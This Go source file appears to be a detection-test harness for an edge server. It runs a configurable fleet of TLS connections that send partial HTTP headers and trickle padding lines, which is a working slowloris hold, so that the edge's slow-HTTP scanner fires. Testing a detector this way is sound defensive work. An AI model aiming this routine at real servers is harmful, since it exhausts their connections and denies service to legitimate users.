// evaders/slow-http/main — HTTP/1.1 slow-header (slowloris) hold against the edge.
// Opens N ALPN-http/1.1 connections that dribble an incomplete request header, so the edge's SlowLorisScanner fires.

package main

import (
	"crypto/tls"
	"encoding/json"
	"fmt"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

func env(k, def string) string {
	if v := os.Getenv(k); v != "" {
		return v
	}
	return def
}

func envInt(k string, def int) int {
	if v, err := strconv.Atoi(os.Getenv(k)); err == nil && v > 0 {
		return v
	}
	return def
}

// held is one connection's outcome: how long it was held and whether the edge kept it open (a successful
// slowloris hold) or closed it (its ReadTimeout / mitigation fired first).
type held struct {
	index     int
	bytesSent int
	heldMS    int64
	kept      bool // the connection was still writable at the end of the hold (the edge had not closed it)
	err       string
}

// slowConn opens one ALPN-http/1.1 TLS connection and dribbles a partial request header that never
// terminates (no CRLFCRLF), holding the socket for holdFor. It NEVER completes a request — the classic
// slowloris connection-table hold. Returns what it observed for reporting.
func slowConn(host, authority string, index int, holdFor time.Duration) held {
	h := held{index: index}
	conn, err := tls.Dial("tcp", host, &tls.Config{InsecureSkipVerify: true, NextProtos: []string{"http/1.1"}}) //nolint:gosec
	if err != nil {
		h.err = err.Error()
		return h
	}
	defer conn.Close()

	start := time.Now()
	// The request line + one header, then dribble a fresh (incomplete) header line every few seconds and
	// NEVER send the terminating CRLFCRLF. A real client sends its whole header block in one burst.
	write := func(s string) bool {
		_ = conn.SetWriteDeadline(time.Now().Add(3 * time.Second))
		n, werr := conn.Write([]byte(s))
		h.bytesSent += n
		return werr == nil
	}
	if !write("GET / HTTP/1.1\r\nHost: " + authority + "\r\n") {
		h.err = "server refused the opening request line"
		h.heldMS = time.Since(start).Milliseconds()
		return h
	}
	deadline := start.Add(holdFor)
	h.kept = true
	for time.Now().Before(deadline) {
		time.Sleep(3 * time.Second)
		// A single dribbled header byte-line keeps the connection "active" without completing the header.
		if !write(fmt.Sprintf("X-Pad-%d: keepalive\r\n", index)) {
			h.kept = false // the edge closed the connection (ReadTimeout / slow-HTTP mitigation) before the hold ended
			break
		}
	}
	h.heldMS = time.Since(start).Milliseconds()
	return h
}

func main() {
	edge := env("KITSUNE_EDGE", "https://edge:8443/")
	conns := envInt("KS_CONNS", 8)           // a slowloris FLEET of held connections (also grounds the G17 aggregate)
	holdSec := envInt("KS_HOLD_SECONDS", 14) // hold past the edge's 10s slow-HTTP budget so the tell fires
	mode := env("KS_MODE", "slowloris")

	u, err := url.Parse(edge)
	if err != nil {
		panic(err)
	}
	host := u.Host
	if !strings.Contains(host, ":") {
		host += ":443"
	}
	authority := u.Hostname()

	results := make([]held, conns)
	var wg sync.WaitGroup
	for i := 0; i < conns; i++ {
		wg.Add(1)
		go func(idx int) {
			defer wg.Done()
			results[idx] = slowConn(host, authority, idx, time.Duration(holdSec)*time.Second)
		}(i)
	}
	wg.Wait()

	kept, failed, totalBytes := 0, 0, 0
	for _, r := range results {
		if r.err != "" {
			failed++
		} else if r.kept {
			kept++
		}
		totalBytes += r.bytesSent
	}
	summary := map[string]any{
		"mode":         mode,
		"connections":  conns,
		"held_open":    kept, // connections the edge kept open through the hold (a successful slowloris hold)
		"failed":       failed,
		"total_bytes":  totalBytes, // a trickle — the point is holding sockets, not volume
		"hold_seconds": holdSec,
		"note":         "each held connection emits network.slow_http_attack -> net.slow_http_attack; a fleet of them aggregates as an L7 flood (coordination DoS tell)",
	}
	out, _ := json.Marshal(map[string]any{"mode": "slow-http", "result": summary})
	fmt.Println("__KS__" + string(out))
}
